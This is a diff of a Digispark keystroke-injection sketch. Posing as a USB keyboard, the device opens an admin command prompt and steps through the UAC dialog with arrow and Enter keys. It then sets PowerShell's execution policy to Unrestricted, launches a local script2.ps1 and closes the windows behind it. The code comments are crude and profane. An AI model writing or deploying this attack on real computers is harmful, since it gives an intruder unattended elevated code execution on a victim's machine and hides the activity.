@@ -4,7 +4,7 @@
 // TODO better way to get into powershell this shit takes up so much memory
 // comment this shitty ass fucked balls and also the script.ps1 lazy cunt
 #include "DigiKeyboard.h"
-#define KEY_DOWN 0x51
+#define KEY_LEFT 0x50
 void setup() {
   pinMode(1, OUTPUT); // LED Setup
 }
@@ -27,12 +27,20 @@ void loop() {
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
   DigiKeyboard.delay(3000);
-  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  DigiKeyboard.sendKeyStroke(KEY_LEFT);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
   DigiKeyboard.delay(750);
 
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
+
+  for (int i = 0; i < 3; i++)
+  {
+    DigiKeyboard.delay(4000);
+    DigiKeyboard.println("exit");
+  }
 
   digitalWrite(1, LOW);
   for(;;){}
